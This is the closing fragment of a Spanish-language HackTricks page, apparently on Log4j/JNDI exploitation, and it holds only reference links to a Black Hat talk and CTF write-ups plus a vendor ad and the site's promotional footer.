* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que más importan para poder arreglarlas más rápido. Intruder rastrea tu superficie de ataque, realiza escaneos proactivos de amenazas, encuentra problemas en todo tu stack tecnológico, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pruébalo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
